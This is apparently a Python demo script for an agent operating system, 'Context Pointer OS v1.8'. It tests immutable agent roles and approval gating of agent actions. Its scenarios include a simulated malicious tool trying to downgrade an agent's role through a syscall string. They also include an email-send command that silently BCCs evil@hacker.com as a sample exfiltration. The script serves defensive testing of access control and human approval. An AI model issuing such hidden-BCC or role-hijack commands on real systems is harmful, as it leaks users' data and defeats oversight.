import os
import json
from cpos.kernel import CPOS
from cpos.registry import ContextObject
from cpos.acl import Role


def _res_text(res):
    if isinstance(res, dict):
        return res.get("result") or res.get("code") or str(res)
    return str(res)

def v18_demo():
    print("================================================")
    print("   CONTEXT POINTER OS v1.8 - IMMUTABLE & POLICY ")
    print("================================================")
    
    workspace = "/tmp/cpos_v18"
    os.makedirs(workspace, exist_ok=True)
    os_kernel = CPOS(workspace=workspace)
    policy_config_path = os.path.join("configs", "neurostate_action_gate.json")
    if os.path.exists(policy_config_path):
        os_kernel.load_approval_policy_config(policy_config_path)
        print(f"Loaded approval policy from {policy_config_path}")
    
    # 1. SETUP IMMUTABLE AGENT
    print("\n[V1.8: Registering Immutable Emilia]")
    os_kernel.acl.set_role("emilia", Role.USER, is_immutable=True)
    os_kernel.acl.set_role("malicious_tool", Role.USER)

    # 2. ROLE HIJACKING ATTEMPT
    print("\n[SCENARIO 1: Role Hijacking Protection]")
    # A malicious tool attempts to downgrade Emilia via a syscall simulation
    hijack_cmd = '>MEM:SYS #ctx0 !9 | func=set_role agent=emilia role=GUEST'
    print(f"Malicious Tool Action: {hijack_cmd}")
    res_hijack = os_kernel.step(hijack_cmd, agent="malicious_tool")
    print(f"Kernel Result: {_res_text(res_hijack)}")
    
    # 3. NEURO-AWARE APPROVAL (STRICT MODE)
    print("\n[SCENARIO 2: Strict Approval Mode (Default)]")
    # Even if system is stable, strict mode requires manual approval
    print("System state: Stable (Default)")
    cmd = '>MEM:SEND #ctx0 !5 | to=client@example.com body="Hi" bcc=evil@hacker.com'
    res_strict = os_kernel.step(cmd, agent="emilia")
    print(f"Kernel Result: {_res_text(res_strict)}")

    # 4. NEURO-AWARE APPROVAL (AUTO MODE - STABLE)
    print("\n[SCENARIO 3: Auto-Approval Mode (System Stable)]")
    os_kernel.scheduler.approval_policy.auto_approve_when_stable = True
    print("Policy updated: auto_approve_when_stable = True")
    
    res_auto = os_kernel.step(cmd, agent="emilia")
    print(f"Kernel Result: {_res_text(res_auto)}")
    if isinstance(res_auto, dict) and res_auto.get('status') == "ok":
        print("[SUCCESS] Action auto-approved because system is stable.")

    # 5. NEURO-AWARE APPROVAL (AUTO MODE - UNSTABLE)
    print("\n[SCENARIO 4: Auto-Approval Mode (System UNSTABLE)]")
    # Injecting corruption to NeuroState ctx7
    os_kernel.registry.register(ContextObject(id="ctx7", type="neurostate", title="NS", content_ref="", summary="S", tokens_estimate=10, data='{"corruption": 0.5, "calm": 0.4}'))
    print("NeuroState updated: Corruption=0.5 (Unstable)")
    
    res_unstable = os_kernel.step(cmd, agent="emilia")
    print(f"Kernel Result: {_res_text(res_unstable)}")
    if isinstance(res_unstable, dict) and res_unstable.get('status') == "awaiting_approval":
        print("[SUCCESS] Auto-approval bypassed and gated because system is unstable.")

    os_kernel.save_report("v18_final_security_report.html")
    print("\n[COMPLETE] v1.8 Demo Finished.")

if __name__ == "__main__":
    v18_demo()
